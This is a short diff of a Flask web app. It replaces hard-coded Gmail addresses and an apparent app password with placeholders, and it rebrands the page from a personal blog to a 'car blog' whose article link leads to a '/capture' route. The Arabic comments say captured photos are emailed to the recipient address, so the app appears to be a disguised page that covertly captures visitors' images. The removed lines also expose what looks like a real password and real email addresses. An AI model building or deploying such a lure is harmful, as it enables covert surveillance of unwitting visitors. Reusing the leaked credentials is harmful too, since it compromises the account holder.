@@ -6,12 +6,9 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
 
-EMAIL_ADDRESS = "samir.naji998@gmail.com"
-  # استبدل ببريدك الإلكتروني
-EMAIL_PASSWORD = "dsyn exto ikiw jdcx"
-  # استبدل بكلمة مرور البريد أو استخدم كلمة مرور التطبيقات
-RECIPIENT_EMAIL = "samirnaji.999@gmail.com"
-  # استبدل بالبريد الذي تريد إرسال الصور إليه
+EMAIL_ADDRESS = "your_email@gmail.com"  # استبدل ببريدك الإلكتروني
+EMAIL_PASSWORD = "your_email_password"  # استبدل بكلمة مرور البريد أو استخدم كلمة مرور التطبيقات
+RECIPIENT_EMAIL = "recipient_email@gmail.com"  # استبدل بالبريد الذي تريد إرسال الصور إليه
 
 app = Flask(__name__)
 
@@ -35,7 +32,7 @@ def home():
         </style>
     </head>
     <body>
-        <h1>مرحبًا بك في مدونة سمير!</h1>
+        <h1>مرحبًا بك في مدونة السيارات!</h1>
         <div class="container">
             <p>استمتع بمقالاتنا حول السيارات الفاخرة وأحدث الموديلات.</p>
             <div class="article" onclick="window.location.href='/capture'">
